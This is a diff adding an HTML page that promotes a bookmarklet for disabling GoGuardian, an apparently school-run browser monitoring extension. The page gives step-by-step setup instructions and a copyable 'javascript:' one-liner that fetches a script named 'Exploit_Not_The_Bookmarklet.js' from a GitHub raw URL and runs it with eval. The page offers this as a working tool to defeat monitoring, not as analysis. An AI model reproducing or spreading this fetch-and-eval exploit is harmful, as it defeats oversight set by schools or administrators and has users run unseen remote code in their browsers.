@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Disable Goguardian with a Bookmarklet</title>
+  <link rel="stylesheet" href="style.css">
+  <style>body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 20px;
+    background-color: #f4f4f4;
+    color: #333; 
+}
+
+header {
+    background-color: #2980b9;
+    color: #fff;
+    padding: 20px;
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+h1 {
+    margin: 0;
+}
+
+section {
+    background-color: #fff;
+    padding: 20px;
+    margin-bottom: 20px;
+    border-radius: 5px;
+    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+}
+
+footer {
+    background-color: #333;
+    color: #fff;
+    text-align: center;
+    padding: 15px;
+    position: fixed; /* To keep it at the bottom */
+    bottom: 0;
+    width: 100%;
+}
+</style>
+</head>
+<body>
+  <header>
+    <h1>Taking Control of Your Browsing Experience</h1>
+  </header>
+  <main>
+    <section>
+      <h2>Introducing the Goguardian Disable Bookmarklet</h2>
+      <p>This innovative tool empowers you to temporarily disable the Goguardian extension, granting you more control over your browsing activity.</p>
+      <p>**Here's what it can do:**</p>
+      <ul>
+        <li>Provides a convenient way to temporarily suspend Goguardian's monitoring.</li>
+        <li>Offers increased flexibility in your browsing experience.</li>
+      </ul>
+      <p>**Please note:** Disabling Goguardian may expose you to potentially harmful content online. Use this tool responsibly and with caution.</p>
+    </section>
+    <section>
+      <h2>How to Use the Bookmarklet</h2>
+      <ol>
+        <li>**Favorite this page** for easy access.</li>
+        <li>In your browser, click the bookmarked page and navigate to the bookmark's details (often accessible through right-click).</li>
+        <li>Locate the URL field and edit it. Paste the provided JavaScript code (TheActualBookmarklet.js) into the URL field.</li>
+        <li>Save the changes to your bookmark.</li>
+        <li>**Important:** Visit Chrome.google.com/webstore and click the edited bookmark repeatedly. You should see a notification confirming Goguardian's disablement.</li>
+      </ol>
+      <p>**Disclaimer:** This method might not work in all browsers or Goguardian versions. It's recommended to consult browser and extension documentation for the latest information.</p>
+    </section>
+  </main>
+      <div class="code-container">
+        <pre><code>
+javascript:fetch(`https://raw.githubusercontent.com/H4lyc0n/Goguardian-killer/main/Exploit_Not_The_Bookmarklet.js`).then(data=>{data.text().then(text=>{eval(text)})});
+        </code></pre>
+        <button id="copyButton">Copy Code</button>
+    </div>
+
+    <script>
+      const copyButton = document.getElementById('copyButton');
+const codeElement = document.querySelector('code'); 
+
+copyButton.addEventListener('click', () => {
+  // Create a temporary textarea to hold the code
+  const textarea = document.createElement('textarea');
+  textarea.value = codeElement.textContent;
+  document.body.appendChild(textarea);
+  textarea.select();
+
+  // Copy and inform the user
+  try {
+    document.execCommand('copy');
+    alert('Code copied to clipboard!'); 
+  } catch (err) {
+    console.error('Unable to copy code: ', err);
+  } finally {
+    document.body.removeChild(textarea); // Remove temporary textarea
+  }
+});
+
+    </script>
+  <footer>
+    <p>Created by Flynn O'Connor</p>
+  </footer>
+</body>
+</html>
